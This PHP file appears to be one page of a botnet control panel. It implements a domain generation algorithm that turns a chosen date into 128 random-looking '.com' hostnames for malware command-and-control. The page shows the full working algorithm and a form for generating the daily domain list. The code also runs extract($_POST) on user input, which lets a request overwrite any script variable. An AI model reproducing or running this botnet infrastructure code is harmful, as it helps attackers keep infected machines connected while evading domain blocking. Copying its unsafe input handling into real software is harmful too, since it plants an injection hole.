<?php

define("TPL_TITLE", "DGA");

function ROL($value, $shift) {
	$sft = $shift & 0x1F;
	return ($value << $sft) | (($value >> (32 - $sft)) & ((1 << (0x1F & $sft)) - 1));
}

function DGA($d, $m, $Y)
{
	$K = 0x2ab3fea3;
	$k = $Y . intval($m) . intval($d);
	$hosts = array();
	
	for ($i = 0; $i < 128; ++$i) 
	{
		$host = "";
		for ($j = 0; $j < 16; ++$j) 
		{
			$k = ROL($k, 8);
			$k += $K + $i + $j;
			
			$ch = 97 + abs($k % 25);
			$host .= chr($ch);
		}
		
		$hosts[] = $host . ".com";
	}
	
	return $hosts;
}

$day = date("d");
$month = date("m");
$year = date("Y");

if (isset($_POST)) extract($_POST);

if ($day == 0 || $day > 31 || $month == 0 || $month > 12 || $year < 2015 || $year > 2030)
	header("Location: " . $_SERVER["REQUEST_URI"]);	

$hosts = DGA($day, $month, $year);

$cnt = count($hosts);
$tpl_hosts = "";

for ($i = 0; $i < $cnt; ++$i) {
	$tpl_hosts .= ($i + 1) . ") " . $hosts[$i] . "<br>";
}

ob_start();
?>

<form class="form-horizontal" method='post'>
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<td class="col-md-1"> Year: </td> 
			<td> <input type="text" class="form-control input-sm" name="year" value="<?=$year?>"> </td>
		</tr>
		<tr>
			<td> Month: </td> 
			<td> <input type="text" class="form-control input-sm" name="month" value="<?=$month?>"> </td>
		</tr>
		<tr>
			<td> Day: </td> 
			<td> <input type="text" class="form-control input-sm" name="day" value="<?=$day?>"> </td>
		</tr>
	</table>
	<button type="submit" name='save' class="btn btn-default btn-sm">Generate</button> 
</form>
<div class="col-xs-12"> &nbsp  </div>

<?=$tpl_hosts?>

<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{DGA_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>